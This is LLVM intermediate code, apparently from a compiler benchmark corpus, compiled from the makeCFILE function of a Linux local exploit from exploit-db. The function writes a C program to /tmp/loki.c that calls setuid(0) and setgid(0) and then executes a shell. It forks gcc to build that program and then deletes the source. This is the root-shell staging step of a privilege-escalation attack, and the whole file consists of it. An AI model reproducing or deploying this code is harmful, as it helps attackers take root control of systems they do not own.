; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20004.c_makeCFILE.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20004.c_makeCFILE.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [12 x i8] c"/tmp/loki.c\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"#include <stdio.h>\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"main()\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"{\0A   setuid(0);\0A\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"   setgid(0);\0A\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"   execl(\22\00", align 1
@SHAT = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [17 x i8] c"\22, \22sh\22, NULL);\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"}\00", align 1
@GCCAT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [4 x i8] c"gcc\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"-o\00", align 1
@SHELLAT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @makeCFILE() #0 {
  %1 = alloca i32*, align 8
  %2 = alloca i32, align 4
  %3 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %3, i32** %1, align 8
  %4 = load i32*, i32** %1, align 8
  %5 = call i32 @fprintf(i32* %4, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %6 = load i32*, i32** %1, align 8
  %7 = call i32 @fprintf(i32* %6, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %8 = load i32*, i32** %1, align 8
  %9 = call i32 @fprintf(i32* %8, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %10 = load i32*, i32** %1, align 8
  %11 = call i32 @fprintf(i32* %10, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %12 = load i32*, i32** %1, align 8
  %13 = call i32 @fprintf(i32* %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0))
  %14 = load i32*, i32** %1, align 8
  %15 = load i8*, i8** @SHAT, align 8
  %16 = call i32 @fprintf(i32* %14, i8* %15)
  %17 = load i32*, i32** %1, align 8
  %18 = call i32 @fprintf(i32* %17, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0))
  %19 = load i32*, i32** %1, align 8
  %20 = call i32 @fprintf(i32* %19, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  %21 = load i32*, i32** %1, align 8
  %22 = call i32 @fflush(i32* %21)
  %23 = load i32*, i32** %1, align 8
  %24 = call i32 @fclose(i32* %23)
  %25 = call i32 (...) @fork()
  store i32 %25, i32* %2, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

27:                                               ; preds = %0
  %28 = load i32, i32* @GCCAT, align 4
  %29 = load i32, i32* @SHELLAT, align 4
  %30 = call i32 @execl(i32 %28, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i32 %29, i32* null)
  br label %31

31:                                               ; preds = %27, %0
  %32 = call i32 (...) @wait()
  %33 = call i32 @unlink(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  ret void
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fflush(i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @execl(i32, i8*, i8*, i8*, i32, i32*) #1

declare dso_local i32 @wait(...) #1

declare dso_local i32 @unlink(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
